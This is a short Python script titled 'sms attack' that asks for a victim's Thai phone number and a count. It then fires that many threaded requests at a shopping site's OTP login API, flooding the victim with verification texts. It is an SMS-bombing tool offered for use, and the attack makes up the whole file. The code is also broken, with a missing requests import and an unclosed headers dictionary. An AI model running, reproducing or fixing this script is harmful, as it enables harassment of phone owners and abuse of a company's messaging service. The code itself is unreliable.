#โมดูล
import os
import time
import threading
from requests import get
from re import search
from requests import Session
from threading import Thread
import colorama
os.system("clear") 
print("𝒔𝒎𝒔 𝒂𝒕𝒕𝒂𝒄𝒌 𝒃𝒚 𝑬𝑯 ")
phone = input("𝚙𝚑𝚘𝚗𝚎 : ")
print("")
NUM = int(input("𝙽𝚞𝚖 : ")) 
time.sleep(1) 

def api1(): 
	requests.post("https://api.zaapi.co/api/store/auth/otp/login",json={"phoneNumber":f"+66{phone[1:]}","namespace":"zaapi-buyers"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36")
	print ("𝒂𝒕𝒕𝒂𝒄𝒌 | แล้ว | ") 
	
for i in range(NUM): 
	threading.Thread(target=api1).start() 
	
